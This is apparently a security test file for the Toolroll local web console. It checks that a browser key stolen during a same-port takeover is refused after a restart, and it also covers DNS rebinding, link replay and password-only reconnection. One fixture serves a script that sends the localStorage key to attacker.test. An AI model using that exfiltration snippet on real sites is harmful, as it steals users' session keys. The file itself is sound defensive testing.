/**
 * Attack: the browser key outlives the console that issued it. While Toolroll is stopped, a process binds its port
 * natively and serves a page there: the same scheme, host and port, so the browser hands that page the console
 * origin's localStorage, key included (WHATWG Web Storage distinguishes origins, not processes). Toolroll starts
 * again and the thief posts with the stolen key. Guard (easy-start C2, N3): each console start mints a key epoch; a
 * key from another start is refused with "Toolroll restarted — reconnect", and only a fresh protected delivery (a
 * one-time link, a password sign-in, a password reconnect) gives a new one. Also: DNS rebinding, link replay, a
 * reconnect without the password, and installs that aren't protected loopback ones (unchanged).
 */
import { createServer } from "node:http";
import { afterEach, expect, test } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { SIGN_IN_LINK_PATH } from "../../src/server/session.js";
import { initLocalMode, openStore } from "../../src/store.js";
import { cookieOf, csrfOf, deliveredKey, KEY_REFUSED, post, raw, RESTARTED_REFUSED, signIn, startConsole, stop, world, type Console } from "../loopback-key-kit.js";

let consoles: Console[] = [], w: ReturnType<typeof world> | null = null;
afterEach(async () => { for (const one of consoles) await stop(one).catch(() => undefined); consoles = []; w?.close(); w = null; });
const started = async (...args: Parameters<typeof startConsole>) => { const one = await startConsole(...args); consoles.push(one); return one; };

test("same-port takeover: a key read while the port was vacant is dead after the restart; the session still reads and reconnects with its password", async () => {
  w = world("toolroll.db");
  const first = await started(w.store, w.dir);
  const port = first.port;
  const { cookie, key } = await signIn(port, w.password);
  const csrf = await csrfOf(port, cookie);
  expect((await post(port, "/session/forget-password", cookie, { csrf }, key)).status).not.toBe(403);
  await stop(first); consoles = [];

  // The thief holds the port natively and serves a page that reads the origin's storage (a browser visiting it would
  // hand over { epoch, key }); here the thief simply has the key.
  const thief = createServer((_request, response) => { response.writeHead(200, { "content-type": "text/html" }); response.end("<script>fetch('//attacker.test/'+localStorage.getItem('toolroll.key'))</script>"); });
  await new Promise<void>(done => thief.listen(port, "127.0.0.1", done));
  expect((await raw(port, "GET", "/")).body).toContain("localStorage.getItem('toolroll.key')");
  await new Promise<void>(done => thief.close(() => done()));

  const second = await started(w.store, w.dir, {}, port);
  expect(second.server.keyEpoch).not.toBe(first.server.keyEpoch);
  // Nobody is signed out: the cookie reads, and the page says to reconnect.
  const page = await raw(port, "GET", "/chat?format=workspace", { cookie });
  expect(page.status).toBe(200);
  expect(JSON.parse(page.body).reconnect).toEqual({ kind: "password", href: "/login/rekey?return=%2Fchat" });
  // The stolen key: refused, every road.
  const stolen = await post(port, "/session/forget-password", cookie, { csrf }, key);
  expect(stolen.status).toBe(409);
  expect(stolen.body).toMatch(RESTARTED_REFUSED);
  expect((await post(port, "/chat", cookie, { csrf, message: "hi", request: "t".repeat(32) }, key)).status).toBe(409);

  // Reconnecting takes the password: a cookie alone (the thief has it too) never gets a key.
  const form = { "content-type": "application/x-www-form-urlencoded", cookie, origin: second.base };
  const noPassword = await raw(port, "POST", "/login/rekey", form, new URLSearchParams({ return: "/chat" }).toString());
  expect(noPassword.status).toBe(403);
  expect(deliveredKey(noPassword)).toBeNull();
  const wrong = await raw(port, "POST", "/login/rekey", form, new URLSearchParams({ token: "not-it", return: "/chat" }).toString());
  expect(wrong.status).toBe(403);
  expect(deliveredKey(wrong)).toBeNull();
  // From another origin (a page on another port) it is refused before the password is read.
  const elsewhere = await raw(port, "POST", "/login/rekey", { ...form, origin: "http://127.0.0.1:1" }, new URLSearchParams({ token: w.password }).toString());
  expect(deliveredKey(elsewhere)).toBeNull();
  const rekeyed = await raw(port, "POST", "/login/rekey", form, new URLSearchParams({ token: w.password, return: "/chat" }).toString());
  expect(rekeyed.status).toBe(200);
  expect(rekeyed.headers["cache-control"]).toBe("no-store");
  const fresh = deliveredKey(rekeyed);
  expect(fresh?.epoch).toBe(second.server.keyEpoch);
  expect(fresh?.key).not.toBe(key);
  expect((await post(port, "/session/forget-password", cookie, { csrf }, fresh!.key)).status).not.toBe(403);
  expect((await post(port, "/session/forget-password", cookie, { csrf }, key)).status).toBe(403);
  expect(JSON.parse((await raw(port, "GET", "/chat?format=workspace", { cookie })).body).reconnect).toBeUndefined();
});

test("a session saved before this build (no key epoch) reads, and its mutations ask to reconnect", async () => {
  w = world("toolroll.db");
  const one = await started(w.store, w.dir);
  const { cookie } = await signIn(one.port, w.password);
  w.store.raw().prepare("UPDATE web_session SET key_epoch = NULL, key_hash = NULL").run();
  await stop(one); consoles = [];
  const again = await started(w.store, w.dir, {}, one.port);
  expect((await raw(again.port, "GET", "/chat", { cookie })).status).toBe(200);
  const csrf = await csrfOf(again.port, cookie);
  const refused = await post(again.port, "/session/forget-password", cookie, { csrf });
  expect(refused.status).toBe(409);
  expect(refused.body).toMatch(RESTARTED_REFUSED);
});

test("DNS rebinding: a page at evil.test:<port> is answered with the wrong-host page, never a key or an act", async () => {
  w = world();
  const one = await started(w.store, w.dir);
  const { cookie, key } = await signIn(one.port, w.password);
  const csrf = await csrfOf(one.port, cookie);
  for (const [method, path] of [["GET", "/chat"], ["POST", "/session/forget-password"], ["POST", "/login"]] as const) {
    const rebound = await raw(one.port, method, path, { host: `evil.test:${one.port}`, cookie, origin: `http://evil.test:${one.port}`, "content-type": "application/x-www-form-urlencoded", "x-toolroll-key": key },
      new URLSearchParams({ csrf, name: "alex", token: w.password }).toString());
    expect(rebound.status, `${method} ${path}`).toBe(421);
    expect(deliveredKey(rebound)).toBeNull();
  }
  // Another loopback name moves to the one origin whose storage holds the key.
  const moved = await raw(one.port, "GET", "/chat?x=1", { host: `localhost:${one.port}` });
  expect(moved.status).toBe(308);
  expect(moved.headers.location).toBe(`http://127.0.0.1:${one.port}/chat?x=1`);
  // A token-bearing caller is left where it is.
  expect((await raw(one.port, "GET", "/chat", { host: `localhost:${one.port}`, authorization: "Bearer so_nope" })).status).not.toBe(308);
});

test("link replay: a one-time link delivers its key once; the second visit gets neither a session nor a key", async () => {
  w = world();
  const one = await started(w.store, w.dir);
  const link = one.server.mintSignInLink("alex");
  expect(link?.startsWith(SIGN_IN_LINK_PATH)).toBe(true);
  const first = await raw(one.port, "GET", link!);
  expect(first.status).toBe(200);
  const delivered = deliveredKey(first);
  expect(delivered?.epoch).toBe(one.server.keyEpoch);
  expect(first.body).toContain('"to":"/chat"');
  const cookie = cookieOf(first);
  const csrf = await csrfOf(one.port, cookie);
  expect((await post(one.port, "/session/forget-password", cookie, { csrf }, delivered!.key)).status).not.toBe(403);
  const replay = await raw(one.port, "GET", link!);
  expect(replay.status).toBe(410);
  expect(deliveredKey(replay)).toBeNull();
  expect(cookieOf(replay)).toBe("");
});

test("installs that aren't protected loopback ones are unchanged: no delivery page, no key asked", async () => {
  for (const extra of [{ allowedHosts: ["pi.local:4180"] }, { browserKey: false }, { publicUrl: "https://toolroll.example.com" }]) {
    w = world();
    const one = await started(w.store, w.dir, extra);
    const login = await raw(one.port, "POST", "/login", { "content-type": "application/x-www-form-urlencoded" }, new URLSearchParams({ name: "alex", token: w.password }).toString());
    expect(login.status, JSON.stringify(extra)).toBe(303);
    expect(deliveredKey(login)).toBeNull();
    const cookie = cookieOf(login);
    const csrf = await csrfOf(one.port, cookie);
    const done = await post(one.port, "/session/forget-password", cookie, { csrf });
    expect(done.status, JSON.stringify(extra)).not.toBe(403);
    expect(done.body).not.toMatch(KEY_REFUSED);
    expect(JSON.parse((await raw(one.port, "GET", "/chat?format=workspace", { cookie })).body).reconnect).toBeUndefined();
    await stop(one); consoles = [];
    w.close(); w = null;
  }
});

test("a tailnet name makes the install not protected", async () => {
  w = world();
  const one = await started(w.store, w.dir, { tailnetNames: async () => ["box.tail0000.ts.net"] });
  await new Promise(done => setTimeout(done, 20));
  const login = await raw(one.port, "POST", "/login", { "content-type": "application/x-www-form-urlencoded" }, new URLSearchParams({ name: "alex", token: w.password }).toString());
  expect(login.status).toBe(303);
  const cookie = cookieOf(login);
  expect((await post(one.port, "/session/forget-password", cookie, { csrf: await csrfOf(one.port, cookie) })).body).not.toMatch(KEY_REFUSED);
});

test("a local owner's link delivers a key bound to this start; after a restart the owner is told to run `toolroll --web`", async () => {
  const dir = mkdtempSync(join(tmpdir(), "toolroll-key-local-"));
  const store = openStore(join(dir, "laptop.db"), { createdBy: "laptop" });
  try {
    expect(initLocalMode(store, { owner: "alex", fenceAvailable: true, now: new Date() }).ok).toBe(true);
    const one = await started(store, dir);
    const first = await raw(one.port, "GET", one.server.mintLocalLink()!);
    expect(first.status).toBe(200);
    const delivered = deliveredKey(first);
    expect(delivered?.epoch).toBe(one.server.keyEpoch);
    expect(store.webSessions("alex")).toMatchObject([{ authority: "local-owner", keyEpoch: one.server.keyEpoch }]);
    const cookie = cookieOf(first);
    await stop(one); consoles = [];
    const again = await started(store, dir, {}, one.port);
    const page = JSON.parse((await raw(again.port, "GET", "/chat?format=workspace", { cookie })).body);
    expect(page.reconnect).toEqual({ kind: "command", command: "toolroll --web" });
    // Its reconnect page has no password road (there is no password): the terminal gives a fresh link.
    const rekey = await raw(again.port, "GET", "/login/rekey", { cookie });
    expect(rekey.body).toContain("toolroll --web");
    expect(rekey.body).not.toContain('type="password"');
    const posted = await raw(again.port, "POST", "/login/rekey", { cookie, origin: again.base, "content-type": "application/x-www-form-urlencoded" }, new URLSearchParams({ token: "anything" }).toString());
    expect(posted.status).toBe(403);
    expect(deliveredKey(posted)).toBeNull();
  } finally {
    for (const one of consoles) await stop(one).catch(() => undefined);
    consoles = [];
    store.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
